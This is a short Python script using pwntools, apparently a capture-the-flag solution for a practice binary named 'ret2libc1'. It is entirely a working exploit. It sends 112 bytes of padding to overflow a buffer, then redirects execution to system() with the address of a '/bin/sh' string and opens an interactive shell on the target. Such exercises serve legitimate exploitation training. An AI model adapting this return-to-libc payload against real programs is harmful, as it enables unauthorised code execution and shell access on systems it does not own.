##!/usr/bin/env python
from pwn import *

sh = process('./ret2libc1')
binsh_addr = 0x08048720
sys_addr = 0x08048460
payload=flat(['A' * 112, sys_addr, 'bbbb', binsh_addr])

sh.sendline(payload)
sh.interactive()